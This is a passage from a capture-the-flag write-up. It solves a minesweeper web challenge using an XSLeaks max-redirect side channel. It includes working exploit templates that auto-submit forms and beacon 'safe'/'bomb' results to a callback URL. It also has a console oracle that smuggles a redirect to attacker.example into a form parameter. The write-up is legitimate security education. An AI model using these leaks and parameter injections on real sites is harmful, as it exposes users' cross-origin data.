<script>
  document.getElementById('form-clone').submit();
  window.open('/xsleaks/{{tile}}');
</script>
```

`templates/xsleaks.mustache`:

```html
<form id="form-guess" method="post" action="{{CHALL_HOST}}/guess" target="_blank">
  <input type="hidden" name="guess" value="{{tile}}" />
</form>

<form id="form-callback" method="get" action="https://xsinator.com/testcases/files/maxredirect.php" target="redirect-window">
  <input type="hidden" name="n" value="18" />
  <input type="hidden" name="url" value="{{CHALL_HOST}}/board" />
</form>

<script>
  const sleep = t => new Promise((resolve) => setTimeout(resolve, t));

  const callback = w => {
    const result = w.window == null ? 'safe' : 'bomb';
    navigator.sendBeacon(`{{{CALLBACK_URL}}}/${result}`);
  }

  let w = window.open('', 'redirect-window');

  const leak = async () => {
    document.getElementById('form-callback').submit();
    await sleep(2500);
    callback(w);
    await sleep(100);
    callback(w);
    await sleep(100);
    callback(w);
    await sleep(100);
    callback(w);
    await sleep(100);
    callback(w);
  };

  window.opener.onunload = () => {
    document.getElementById('form-guess').submit()
    leak();
  }
</script>
```

</details>

This application allows us to redirect the bot to `https://attacker.example/entry/<tile>`,
triggering the XSLeaks exploit, which will (eventually) print out "safe" or "bomb".

Finally, since sending these requests manually would be tiring, we can declare a
JavaScript function in our browser's console that simply takes the index of the tile
we want to reveal and sends the appropriate request:

```js
const oracle = (tile) => fetch(`/checkboard`, {
  method: 'POST',
  body: new URLSearchParams({
    cloneid: `something&redirect=//attacker.example/entry/${tile}`,
  }),
});
```

Running `oracle(0)` should, within about 10 seconds, tell us whether the tile
on the top-left corner is a bomb, printing this information to to the terminal
running our Node.js application.

### Play Strategies

As you might recall, in order to get the flag we need to get 20 perfect games,
which would be easy to do using the oracle in combination with some automated
solver.
However, I was too lazy to implement one, so I ended up playing the 20 games by
hand, which took way too long, but was definitely faster than trying to
implement a solver for it.
Here are some strategies that I adopted:

- First, I made a drawing of the board with the tile numbers, which made it
  easier to use the oracle on the correct tile without having to count each time;
- Second, it is possible to restart the board whenever we want, by calling the
  `/newboard` GET endpoint, without it incurring a loss, which is useful for when
  there is a 50/50 and we are out of oracles (recall that we have 5 per game);
- Third, I always start with the top-left corner and restart the board if it is
  a bomb, maximising the number of available oracles throughout the game;
- Fourth, it is important to keep in mind the aforementioned peculiarities
  of the board generation function, which help on certain 50/50 situations.

Using these strategies, it is quite easy to get the 20 wins, even if it takes
a while.
Below is a sample gameplay:

{{ img(caption="Sample gameplay animation using the oracle for tiles 0, 6, 42, 45 and 40", path="./using-oracle.gif") }}

After repeating the process 20 times, we get the flag on the home page:

{{ img(caption="The homepage showing the flag after winning 20 out of 20 games", path="./flag-view.png") }}

## Final Remarks

Solving this challenge makes us take a deep dive into navigation-related
side channels on the web, inferring information that would otherwise
not be possible to extract.
Even with all the sandboxing built into the browser, it is still not
enough to properly isolate different origins from each other.

While I hit many road blocks while trying to solve this challenge, it ended
up being very fun, and I definitely have deepened my knowledge in XSLeaks.

[XSLeaks]: https://xsleaks.dev
[CSP header]: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
[cors-header]: https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
[cookie-lax]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#lax
[coop-header]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Opener-Policy
[corp-header]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Resource-Policy
[max-redirects]: https://xsleaks.dev/docs/attacks/navigations/#max-redirects
[unload-event]: https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event
[window-opener]: https://developer.mozilla.org/en-US/docs/Web/API/Window/opener
[max-redirect-demo]: https://xsinator.com/testing.html#Max%20Redirect%20Leak
[Express]: https://expressjs.com/
[Mustache]: https://mustache.github.io/
